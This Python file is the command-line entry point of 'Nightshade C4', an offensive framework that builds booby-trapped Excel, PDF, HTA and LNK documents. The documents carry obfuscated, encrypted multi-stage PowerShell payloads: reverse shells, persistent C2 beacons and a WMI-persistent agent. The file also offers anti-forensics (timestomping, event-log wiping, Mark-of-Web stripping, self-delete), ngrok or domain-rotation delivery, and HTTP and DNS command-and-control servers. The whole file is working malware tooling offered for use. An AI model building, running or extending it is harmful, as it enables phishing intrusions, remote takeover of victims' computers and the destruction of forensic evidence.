#!/usr/bin/env python3
"""
Nightshade C4 — APT-Grade Document Dropper & C2 Framework
Author: ek0ms savi0r

Usage:
    nightshade generate        Generate documents interactively
    nightshade generate --headless --config config.yaml
    nightshade serve           Start C2 server
    nightshade serve --tls --port 443 --host 0.0.0.0
    nightshade dns             Start DNS C2 listener
    nightshade dns --domain dns-c2.local --port 53
    nightshade config          Generate/edit YAML config
    nightshade config --show   Display current config
"""
import os
import sys
import json
import yaml
import argparse
import uuid
import random

_SCRIPT_DIR = os.path.dirname(os.path.abspath(__file__))
if _SCRIPT_DIR not in sys.path:
    sys.path.insert(0, _SCRIPT_DIR)

from core.crypto import NightshadeCrypto
from core.evasion import EvasionGenerator
from core.obfuscation import PSObfuscator, VBAObfuscator
from core.anti_forensics import MarkOfWebStripper, Timestomper, SelfDestruct
from payloads.powershell import PowerShellPayloadFactory
from payloads.vba import VBAPayloadFactory
from payloads.stager import Stage0Generator, Stage1Generator, Stage2Generator
from payloads.shellcode import ShellcodeGenerator
from documents.excel import ExcelDropper
from documents.pdf import PDFDropper
from documents.hta import HTADropper
from documents.lnk import LNKDropper
from c2.server import run_server
from c2.handlers.dns import DNSC2Handler
from infrastructure.ngrok import NgrokManager
from infrastructure.domains import DomainRotator
from infrastructure.tls import TLSCertManager


# ANSI color codes
class C:
    HEADER = '\033[96m'
    BLUE = '\033[94m'
    CYAN = '\033[96m'
    GREEN = '\033[92m'
    YELLOW = '\033[93m'
    RED = '\033[91m'
    BOLD = '\033[1m'
    DIM = '\033[2m'
    RESET = '\033[0m'


BANNER = f"""
{C.CYAN}{C.BOLD}
    ███╗   ██╗██╗ ██████╗ ██╗  ██╗████████╗███████╗██╗  ██╗ █████╗ ██████╗ ███████╗
    ████╗  ██║██║██╔════╝ ██║  ██║╚══██╔══╝██╔════╝██║  ██║██╔══██╗██╔══██╗██╔════╝
    ██╔██╗ ██║██║██║  ███╗███████║   ██║   ███████╗███████║███████║██║  ██║█████╗
    ██║╚██╗██║██║██║   ██║██╔══██║   ██║   ╚════██║██╔══██║██╔══██║██║  ██║██╔══╝
    ██║ ╚████║██║╚██████╔╝██║  ██║   ██║   ███████║██║  ██║██║  ██║██████╔╝███████╗
    ╚═╝  ╚═══╝╚═╝ ╚═════╝ ╚═╝  ╚═╝   ╚═╝   ╚══════╝╚═╝  ╚═╝╚═╝  ╚═╝╚═════╝ ╚══════╝
{C.RESET}
{C.CYAN}    NIGHTSHADE C4  —  APT-Grade Document Dropper & C2 Framework{C.RESET}
{C.DIM}    Author: ek0ms savi0r{C.RESET}
"""


def load_config(config_path: str) -> dict:
    """Load YAML configuration file."""
    if not os.path.exists(config_path):
        print(f"{C.YELLOW}[!] Config file not found: {config_path}{C.RESET}")
        return {}
    with open(config_path, "r") as f:
        return yaml.safe_load(f) or {}


def interactive_generate(config: dict):
    """Interactive document generation wizard."""
    print(f"\n{C.CYAN}{C.BOLD}[ NIGHT VISION :: DOCUMENT GENERATION ]{C.RESET}\n")

    # Campaign key
    key = input("[?] Encryption key (Enter for auto-generate): ").strip()
    if not key:
        key = NightshadeCrypto.random_key()
        print(f"  {C.GREEN}[+] Generated key: {key}{C.RESET}")
    crypto = NightshadeCrypto(key)
    session_id = str(uuid.uuid4())

    # Payload tier
    print(f"\n{C.BOLD}[?] Payload tier:{C.RESET}")
    print("  1. Reverse Shell (raw TCP)")
    print("  2. RCE + Persistence (HTTP C2 beacon)")
    print("  3. Full C2 Agent (advanced HTTP C2 + WMI persistence)")
    tier = input("[?] Tier [2]: ").strip() or "2"
    tier_map = {"1": 1, "2": 2, "3": 3}
    payload_tier = tier_map.get(tier, 2)
    tier_names = {1: "Reverse Shell", 2: "RCE + Persistence", 3: "Full C2 Agent"}
    print(f"  {C.GREEN}[+] Selected: {tier_names[payload_tier]}{C.RESET}")

    # C2 config
    lhost = "127.0.0.1"
    lport = 4444
    c2_url = f"http://{lhost}:8080"
    c2_host = "127.0.0.1"
    c2_port = 8080

    print(f"\n{C.BOLD}[?] C2 configuration:{C.RESET}")
    use_dns = input("[?] Use DNS C2 instead of HTTP? (y/N): ").strip().lower() in ("y", "yes")
    if use_dns:
        c2_domain = input("[?] DNS C2 domain [dns-c2.local]: ").strip() or "dns-c2.local"
        c2_url = f"dns://{c2_domain}"
    elif payload_tier == 1:
        lhost = input("[?] LHOST [127.0.0.1]: ").strip() or "127.0.0.1"
        lport_str = input("[?] LPORT [4444]: ").strip() or "4444"
        lport = int(lport_str)
    else:
        c2_host = input("[?] C2 host [127.0.0.1]: ").strip() or "127.0.0.1"
        c2_port_str = input("[?] C2 port [8080]: ").strip() or "8080"
        c2_port = int(c2_port_str)
        c2_url = f"http://{c2_host}:{c2_port}"

    # Delivery method
    print(f"\n{C.BOLD}[?] Delivery method:{C.RESET}")
    print("  1. Ngrok tunnel")
    print("  2. Domain rotation")
    print("  3. Custom domain")
    delivery = input("[?] Method [1]: ").strip() or "1"

    ngrok_used = delivery == "1"
    domain_used = delivery == "2"
    custom_domain = ""
    template_url = ""

    if delivery == "3":
        custom_domain = input("[?] Custom domain: ").strip()
        template_url = f"https://{custom_domain}/template.ole"

    # Document type
    print(f"\n{C.BOLD}[?] Document type:{C.RESET}")
    print("  1. Excel (.xlsx) — OLE template injection")
    print("  2. PDF — OpenAction JavaScript execution")
    print("  3. HTA (.hta) — Auto-executing web document")
    print("  4. LNK (.lnk) — Shortcut with obfuscated PowerShell")
    doc_choice = input("[?] Type [1]: ").strip() or "1"
    doc_types = {"1": ".xlsx", "2": ".pdf", "3": ".hta", "4": ".lnk"}
    doc_ext = doc_types.get(doc_choice, ".xlsx")
    doc_type_map = {"1": "xlsx", "2": "pdf", "3": "hta", "4": "lnk"}
    doc_type = doc_type_map.get(doc_choice, "xlsx")

    fname = input(f"[?] Output filename [nightshade_output{doc_ext}]: ").strip() or f"nightshade_output{doc_ext}"

    # Anti-forensics options
    print(f"\n{C.BOLD}[?] Anti-forensics:{C.RESET}")
    enable_self_delete = input("[?] Enable self-delete after execution? (Y/n): ").strip().lower() not in ("n", "no")
    enable_timestomp = input("[?] Enable timestomping? (Y/n): ").strip().lower() not in ("n", "no")
    enable_log_wipe = input("[?] Enable event log wiping? (y/N): ").strip().lower() in ("y", "yes")
    enable_motw_strip = input("[?] Enable Mark-of-Web stripping? (Y/n): ").strip().lower() not in ("n", "no")

    # Multi-stage payload
    print(f"\n{C.BOLD}[?] Multi-stage payload:{C.RESET}")
    multi_stage = input("[?] Use multi-stage payload (3-stage)? (Y/n): ").strip().lower() not in ("n", "no")

    # Confirm
    print(f"\n  {C.CYAN}{'='*50}{C.RESET}")
    print(f"  {C.BOLD}Campaign key :{C.RESET} {key}")
    print(f"  {C.BOLD}Payload tier :{C.RESET} {tier_names[payload_tier]}")
    print(f"  {C.BOLD}C2 URL       :{C.RESET} {c2_url}")
    print(f"  {C.BOLD}Output       :{C.RESET} {fname}")
    print(f"  {C.BOLD}Delivery     :{C.RESET} {['Ngrok', 'Domain rotation', 'Custom domain'][int(delivery)-1]}")
    print(f"  {C.BOLD}Multi-stage  :{C.RESET} {'Yes' if multi_stage else 'No'}")
    if enable_self_delete:
        print(f"  {C.YELLOW}[!] Self-delete enabled{C.RESET}")
    print(f"  {C.CYAN}{'='*50}{C.RESET}")

    ok = input(f"\n[?] Proceed? (Y/n): ").strip().lower()
    if ok in ("n", "no"):
        print(f"{C.YELLOW}[-] Aborted.{C.RESET}")
        return

    # -- Generate payload --
    print(f"\n{C.CYAN}[*] Generating payload...{C.RESET}")

    # Resolve template URL
    domain_rot = DomainRotator(campaign_id=session_id) if domain_used else None
    if ngrok_used:
        ngrok_mgr = NgrokManager(region="us")
        ngrok_url = ngrok_mgr.get_http_url()
        if ngrok_url:
            template_url = f"{ngrok_url}/template.ole"
        else:
            if domain_rot:
                template_url = domain_rot.template_url()
            else:
                template_url = f"http://{c2_host}:{c2_port}/template.ole"
    elif domain_used and domain_rot:
        template_url = domain_rot.template_url()

    if multi_stage:
        # Generate Stage 2 first (the actual implant)
        stage2_b64 = Stage2Generator.compressed_stage2(
            tier=payload_tier,
            c2_url=c2_url,
            session_id=session_id,
            target_host=lhost,
            target_port=lport,
        )

        # Generate Stage 1 (evasion + stage 2 decompress)
        stage1_code = Stage1Generator.generate_compressed(
            c2_url=c2_url,
            session_id=session_id,
            stage2_b64=stage2_b64,
        )

        # Obfuscate Stage 1
        obs = PSObfuscator()
        stage1_code = obs.obfuscate(stage1_code, layers=3)

        # Generate Stage 0 (tiny beacon)
        stage0_code = Stage0Generator.generate(
            c2_url=c2_url,
            session_id=session_id,
            use_dns=use_dns,
            c2_domain=c2_domain if use_dns else "",
        )

        # The document payload is Stage 0 + inline Stage 1 compressed stream
        # For OLE injection, embed Stage 0 which phones home for Stage 1
        payload_code = stage0_code
    else:
        # Single-stage payload
        ps_factory = PowerShellPayloadFactory(crypto, c2_url, session_id)
        payload_code = ps_factory.generate(tier=payload_tier, target_host=lhost, target_port=lport)

        # Obfuscate
        obs = PSObfuscator()
        payload_code = obs.obfuscate(payload_code, layers=3)

        # Add anti-forensics preamble
        af_parts = []
        if enable_motw_strip:
            af_parts.append(MarkOfWebStripper.powershell_strip())
        if enable_timestomp:
            af_parts.append(Timestomper.powershell_randomize_timestamps("$MyInvocation.MyCommand.Path"))
        if enable_log_wipe and enable_self_delete:
            af_parts.append(SelfDestruct.powershell_wipe_event_logs())
        if enable_self_delete:
            af_parts.append(SelfDestruct.powershell_delayed_delete())

        if af_parts:
            payload_code = "\n".join(af_parts) + "\n\n" + payload_code

    # Compress and encrypt for embedding
    compressed = obs.compress_payload(payload_code)
    payload_b64 = crypto.encrypt(compressed)

    # -- Generate document --
    print(f"{C.CYAN}[*] Building document...{C.RESET}")

    if doc_type == "pdf":
        PDFDropper(crypto, payload_b64).build(fname, template_url)
    elif doc_type == "hta":
        stager_url = f"{template_url.rstrip('/template.ole')}/stage0/{session_id}"
        HTADropper.build_hta_from_url(stager_url, fname)
    elif doc_type == "lnk":
        stager_url = f"{template_url.rstrip('/template.ole')}/stage0/{session_id}"
        LNKDropper.build_download_stager(stager_url, fname)
    else:
        ExcelDropper(crypto, payload_b64).build(fname, template_url)
        # Add self-delete VBA if requested
        if enable_self_delete:
            print(f"  {C.YELLOW}[!] Self-delete VBA macro enabled for Excel document{C.RESET}")

    print(f"\n{C.GREEN}[+] Document created: {fname}{C.RESET}")
    print(f"  {C.BOLD}Key:{C.RESET} {key}")
    print(f"  {C.BOLD}C2 URL:{C.RESET} {c2_url}")
    print(f"  {C.BOLD}Template URL:{C.RESET} {template_url}")

    # Start C2 server?
    if not use_dns:
        start_srv = input(f"\n[CYAN][?] Start C2 server now? (y/N): {C.RESET}").strip().lower()
        if start_srv in ("y", "yes"):
            run_server(
                host="0.0.0.0",
                port=c2_port,
                crypto=crypto,
                tls=False,
                cert_path="",
                key_path="",
            )


def headless_generate(config: dict):
    """Headless document generation from config."""
    key = config.get("key") or os.environ.get("NIGHTSHADE_KEY") or NightshadeCrypto.random_key()
    crypto = NightshadeCrypto(key)
    session_id = str(uuid.uuid4())

    c2_url = config.get("c2_url") or os.environ.get("NIGHTSHADE_C2_URL", "http://127.0.0.1:8080")
    lhost = config.get("lhost") or os.environ.get("NIGHTSHADE_LHOST", "127.0.0.1")
    lport = int(config.get("lport") or os.environ.get("NIGHTSHADE_LPORT", "4444"))
    tier = int(config.get("tier") or os.environ.get("NIGHTSHADE_TIER", "2"))
    doc_type = config.get("doc_type") or os.environ.get("NIGHTSHADE_DOC", "xlsx")
    fname = config.get("output") or os.environ.get("NIGHTSHADE_OUTPUT", f"nightshade_output.{doc_type}")
    template_url = config.get("template_url") or os.environ.get("NIGHTSHADE_TEMPLATE_URL", f"{c2_url}/template.ole")
    multi_stage = config.get("multi_stage", True)
    use_dns = config.get("dns_c2", False)
    c2_domain = config.get("dns_domain", "dns-c2.local")

    print(f"{C.CYAN}[*] Headless generation...{C.RESET}")
    print(f"  Key: {key}")
    print(f"  C2:  {c2_url}")
    print(f"  Doc: {fname}")

    if multi_stage:
        stage2_b64 = Stage2Generator.compressed_stage2(
            tier=tier, c2_url=c2_url, session_id=session_id,
            target_host=lhost, target_port=lport,
        )
        stage1_code = Stage1Generator.generate_compressed(c2_url=c2_url, session_id=session_id, stage2_b64=stage2_b64)
        obs = PSObfuscator()
        stage1_code = obs.obfuscate(stage1_code, layers=3)
        stage0_code = Stage0Generator.generate(c2_url=c2_url, session_id=session_id, use_dns=use_dns, c2_domain=c2_domain)
        payload_code = stage0_code
    else:
        ps_factory = PowerShellPayloadFactory(crypto, c2_url, session_id)
        payload_code = ps_factory.generate(tier=tier, target_host=lhost, target_port=lport)
        obs = PSObfuscator()
        payload_code = obs.obfuscate(payload_code, layers=3)

    compressed = obs.compress_payload(payload_code)
    payload_b64 = crypto.encrypt(compressed)

    if doc_type == "pdf":
        PDFDropper(crypto, payload_b64).build(fname, template_url)
    elif doc_type == "hta":
        stager_url = f"{template_url.rstrip('/template.ole')}/stage0/{session_id}"
        HTADropper.build_hta_from_url(stager_url, fname)
    elif doc_type == "lnk":
        stager_url = f"{template_url.rstrip('/template.ole')}/stage0/{session_id}"
        LNKDropper.build_download_stager(stager_url, fname)
    else:
        ExcelDropper(crypto, payload_b64).build(fname, template_url)

    print(f"{C.GREEN}[+] Generated: {fname}{C.RESET}")


# ------------------------------------------------------------------ #
#  Subcommands                                                         #
# ------------------------------------------------------------------ #

def cmd_generate(args):
    config = load_config(args.config) if args.config else {}
    if args.headless:
        headless_generate(config)
    else:
        interactive_generate(config)


def cmd_serve(args):
    crypto_key = args.key or os.environ.get("NIGHTSHADE_KEY") or NightshadeCrypto.random_key()
    crypto = NightshadeCrypto(crypto_key)
    print(f"  Encryption key: {crypto_key}")

    cert_path = ""
    key_path = ""

    if args.tls:
        tls_mgr = TLSCertManager()
        existing_cert, existing_key = tls_mgr.load_cert_and_key(args.campaign)
        if existing_cert and existing_key:
            cert_path, key_path = existing_cert, existing_key
            print(f"  [*] Using existing TLS certificate: {cert_path}")
        else:
            print(f"  [*] Generating new TLS certificate...")
            cert_path, key_path = tls_mgr.generate_self_signed(
                common_name=args.host,
                campaign_name=args.campaign,
            )

    run_server(
        host=args.host,
        port=args.port,
        crypto=crypto,
        tls=args.tls,
        cert_path=cert_path,
        key_path=key_path,
    )


def cmd_dns(args):
    crypto_key = args.key or os.environ.get("NIGHTSHADE_KEY") or NightshadeCrypto.random_key()
    crypto = NightshadeCrypto(crypto_key)

    print(f"\n{C.CYAN}{C.BOLD}[ NIGHT VISION :: DNS C2 LISTENER ]{C.RESET}\n")
    print(f"  Domain: {args.domain}")
    print(f"  Listen: {args.host}:{args.port}")
    print(f"  Key:    {crypto_key}")

    handler = DNSC2Handler(
        c2_domain=args.domain,
        listen_ip=args.host,
        listen_port=args.port,
        soa_ttl=args.ttl,
    )

    def on_checkin(session_id, ip):
        print(f"  {C.GREEN}[+] DNS check-in: {session_id[:16]}.. from {ip}{C.RESET}")

    def on_result(session_id, result):
        print(f"  {C.YELLOW}[>] DNS result: {session_id[:16]}.. -> {result[:100]}{C.RESET}")

    handler.set_on_checkin(on_checkin)
    handler.set_on_result(on_result)
    handler.start()

    print(f"\n{C.CYAN}[*] DNS C2 listener running. Commands:{C.RESET}")
    print("  sessions       List active DNS sessions")
    print("  cmd <sid> <c>  Send command to session")
    print("  results <sid>  View session results")
    print("  quit           Stop listener")

    try:
        while True:
            cmd = input(f"\n{C.CYAN}dns>{C.RESET} ").strip()
            if cmd == "quit":
                break
            elif cmd == "sessions":
                for s in handler.list_sessions():
                    print(f"  {s['session_id'][:20]}..  {s['ip']}  (last: {s.get('last_seen', 0):.0f})")
            elif cmd.startswith("cmd "):
                parts = cmd.split(" ", 2)
                if len(parts) == 3:
                    handler.enqueue_command(parts[1], parts[2])
                    print(f"  {C.GREEN}[+] Command queued{C.RESET}")
                else:
                    print(f"  {C.RED}Usage: cmd <session_id> <command>{C.RESET}")
            elif cmd.startswith("results "):
                sid = cmd.split(" ", 1)[1]
                # Simple result view (in a real implementation would pull from _results)
                print(f"  Use sessions list to see session data.")
    except KeyboardInterrupt:
        pass

    handler.stop()
    print(f"\n{C.YELLOW}[-] DNS C2 listener stopped.{C.RESET}")


def cmd_config(args):
    config_path = args.config or "config.yaml"

    if args.show:
        if os.path.exists(config_path):
            with open(config_path) as f:
                print(f.read())
        else:
            print(f"{C.YELLOW}[!] No config file at {config_path}{C.RESET}")
        return

    if args.init or not os.path.exists(config_path):
        default_config = {
            "c2_url": "http://127.0.0.1:8080",
            "lhost": "127.0.0.1",
            "lport": 4444,
            "tier": 2,
            "doc_type": "xlsx",
            "output": "nightshade_output.xlsx",
            "template_url": "",
            "multi_stage": True,
            "dns_c2": False,
            "dns_domain": "dns-c2.local",
            "key": "",
        }
        with open(config_path, "w") as f:
            yaml.dump(default_config, f, default_flow_style=False, sort_keys=False)
        print(f"{C.GREEN}[+] Config written to {config_path}{C.RESET}")
    else:
        print(f"{C.YELLOW}[!] Config exists at {config_path}. Use --show to view.{C.RESET}")


def cmd_cert(args):
    """Generate TLS certificates for C2."""
    tls_mgr = TLSCertManager()

    if args.list:
        certs = tls_mgr.list_certificates()
        if certs:
            print(f"\n{C.CYAN}[ Certificates ]{C.RESET}")
            for c in certs:
                print(f"  Campaign: {c['campaign']}")
                print(f"    Subject: {c['subject']}")
                print(f"    Expires: {c['not_after']}")
        else:
            print(f"{C.YELLOW}[!] No certificates found.{C.RESET}")
        return

    cert_path, key_path = tls_mgr.generate_self_signed(
        common_name=args.common_name,
        campaign_name=args.campaign or "default",
        validity_days=args.validity,
        key_size=args.key_size,
    )
    print(f"{C.GREEN}[+] Certificate:{C.RESET} {cert_path}")
    print(f"{C.GREEN}[+] Key:{C.RESET} {key_path}")


# ------------------------------------------------------------------ #
#  Argument parser                                                      #
# ------------------------------------------------------------------ #

def main():
    parser = argparse.ArgumentParser(
        description="Nightshade C4 -- APT-Grade Document Dropper & C2 Framework",
        formatter_class=argparse.RawDescriptionHelpFormatter,
        epilog=f"""
{C.BOLD}Examples:{C.RESET}
  nightshade generate                    Interactive document generation
  nightshade generate --headless         Headless generation
  nightshade serve                       Start C2 server on :8080
  nightshade serve --tls --port 443      Start C2 with TLS
  nightshade dns                         Start DNS C2 listener
  nightshade dns --domain c2.example.com
  nightshade config --init               Create default config.yaml
  nightshade cert --generate             Generate TLS certificate
""",
    )

    subparsers = parser.add_subparsers(dest="command", help="Sub-command")

    # generate
    gen_parser = subparsers.add_parser("generate", help="Generate dropper documents")
    gen_parser.add_argument("--headless", action="store_true", help="Headless mode (uses config/env)")
    gen_parser.add_argument("--config", "-c", type=str, default="", help="Path to YAML config file")
    gen_parser.set_defaults(func=cmd_generate)

    # serve
    serve_parser = subparsers.add_parser("serve", help="Start the C2 HTTP server")
    serve_parser.add_argument("--host", type=str, default="0.0.0.0", help="Listen address (default: 0.0.0.0)")
    serve_parser.add_argument("--port", "-p", type=int, default=8080, help="Listen port (default: 8080)")
    serve_parser.add_argument("--tls", action="store_true", help="Enable TLS/HTTPS")
    serve_parser.add_argument("--key", "-k", type=str, default="", help="Encryption key")
    serve_parser.add_argument("--campaign", type=str, default="default", help="Campaign name for TLS cert")
    serve_parser.set_defaults(func=cmd_serve)

    # dns
    dns_parser = subparsers.add_parser("dns", help="Start DNS C2 listener")
    dns_parser.add_argument("--host", type=str, default="0.0.0.0", help="Listen address")
    dns_parser.add_argument("--port", type=int, default=53, help="DNS listen port (default: 53)")
    dns_parser.add_argument("--domain", type=str, default="dns-c2.local", help="C2 domain (default: dns-c2.local)")
    dns_parser.add_argument("--ttl", type=int, default=60, help="DNS SOA TTL")
    dns_parser.add_argument("--key", "-k", type=str, default="", help="Encryption key")
    dns_parser.set_defaults(func=cmd_dns)

    # config
    cfg_parser = subparsers.add_parser("config", help="Manage configuration file")
    cfg_parser.add_argument("--config", "-c", type=str, default="config.yaml", help="Config file path")
    cfg_parser.add_argument("--init", action="store_true", help="Create default config")
    cfg_parser.add_argument("--show", action="store_true", help="Display current config")
    cfg_parser.set_defaults(func=cmd_config)

    # cert
    cert_parser = subparsers.add_parser("cert", help="Manage TLS certificates")
    cert_parser.add_argument("--generate", action="store_true", help="Generate new certificate")
    cert_parser.add_argument("--list", action="store_true", help="List existing certificates")
    cert_parser.add_argument("--common-name", type=str, default="nightshade-c2.local", help="Certificate CN")
    cert_parser.add_argument("--campaign", type=str, default="default", help="Campaign name")
    cert_parser.add_argument("--validity", type=int, default=365, help="Validity in days")
    cert_parser.add_argument("--key-size", type=int, default=2048, choices=[2048, 4096], help="RSA key size")
    cert_parser.set_defaults(func=cmd_cert)

    # Legacy flags (deprecated but kept for backward compatibility)
    parser.add_argument("--server", action="store_true", help=argparse.SUPPRESS)
    parser.add_argument("--generate", action="store_true", help=argparse.SUPPRESS)

    args = parser.parse_args()

    # Handle legacy flags
    if args.server and not args.command:
        cmd_serve(argparse.Namespace(host="0.0.0.0", port=8080, tls=False, key="", campaign="default"))
        return
    if args.generate and not args.command:
        cmd_generate(argparse.Namespace(headless=False, config=""))
        return

    if hasattr(args, "func"):
        print(BANNER)
        args.func(args)
    else:
        parser.print_help()
        print(BANNER)
        cmd_generate(argparse.Namespace(headless=False, config=""))


if __name__ == "__main__":
    main()
